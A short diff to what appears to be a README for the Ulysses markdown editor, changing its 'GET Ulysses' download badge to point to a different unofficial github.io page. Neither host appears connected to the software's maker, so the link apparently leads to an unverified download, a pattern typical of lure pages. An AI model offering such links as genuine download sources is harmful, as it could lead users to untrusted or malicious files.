@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=a140beca134196c34651c16a4dfd14d67f1376ea-10456573-images-thumbs&n=13)
 
-[![GET Ulysses](https://img.shields.io/badge/GET%20%E2%80%94%20Ulysses-0078D6?style=for-the-badge&logoColor=white)](https://component-store-cleanup-tools.github.io/.github/ulysses-markdown-editor)
+[![GET Ulysses](https://img.shields.io/badge/GET%20%E2%80%94%20Ulysses-0078D6?style=for-the-badge&logoColor=white)](https://samhornwfpv.github.io/.github/ulysses-markdown-editor)
 
 ---
 
